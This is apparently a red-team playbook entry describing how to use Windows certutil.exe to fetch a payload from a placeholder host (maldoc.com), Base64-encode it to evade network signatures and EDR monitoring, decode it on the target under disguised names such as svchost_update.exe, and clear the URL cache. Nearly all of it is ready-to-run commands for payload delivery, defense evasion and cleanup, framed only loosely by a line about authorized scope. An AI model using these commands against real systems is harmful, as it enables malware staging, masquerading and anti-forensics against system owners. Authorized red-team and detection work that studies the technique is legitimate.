# Payload Download and Decoding via Certutil

## When to Use
- During a Red Team engagement or post-exploitation when you have command execution and need to transfer a payload onto the target system.
- When standard tools like `Invoke-WebRequest` or `bitsadmin` are blocked or highly monitored by EDR solutions.
- To evade network signatures by downloading an innocuous Base64 encoded file and decoding it locally using native Windows tools.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Basic Ingress Tool Transfer

```cmd
# Concept: Use certutil.exe to fetch a file via HTTP nimbly # -urlcache: caches the URL. -split: splits the embedded ASN.1 elements and saves to file. -f: forces overwrite.
certutil.exe -urlcache -split -f "http://maldoc.com/payload.exe" C:\Windows\Temp\updater.exe
```

### Phase 2: Defense Evasion through Base64

```bash
# base64 raw_payload.exe > payload.b64
```

### Phase 3: Downloading and Decoding on Target

```cmd
# certutil.exe -urlcache -split -f "http://maldoc.com/payload.b64" C:\Windows\Temp\payload.b64

# certutil.exe -decode C:\Windows\Temp\payload.b64 C:\Windows\Temp\svchost_update.exe
```

### Phase 4: Cleaning Up

```cmd
# certutil.exe -urlcache -split -f "http://maldoc.com/payload.exe" delete
```
